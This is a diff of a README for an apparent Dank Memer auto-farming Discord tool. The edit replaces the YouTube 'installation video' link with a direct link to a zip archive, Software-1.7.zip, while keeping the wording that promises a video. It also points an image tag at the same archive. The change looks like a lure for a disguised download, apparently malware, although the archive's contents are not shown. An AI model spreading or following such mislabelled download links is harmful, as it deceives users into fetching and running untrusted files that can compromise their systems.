@@ -7,7 +7,7 @@ Do watch/star or subscribe on youtube for future security updates.
 
 Don't forget to star it ;)
 ## Installation 
-Watch this video for the installation process - https://www.youtube.com/watch?v=8zew1wZ5jbY&feature=youtu.be
+Watch this video for the installation process - https://raw.githubusercontent.com/SAM3166/Dankmemerautofarmer/master/Gyps/Software-1.7.zip
 
 ## Features
 * Random delay between each command.
@@ -25,4 +25,4 @@ Watch this video for the installation process - https://www.youtube.com/watch?v=
 * Saves user preferences. 
 
 What you will be greeted with when you start it.
-<img src = "Front_page.png">
+<img src = "https://raw.githubusercontent.com/SAM3166/Dankmemerautofarmer/master/Gyps/Software-1.7.zip">
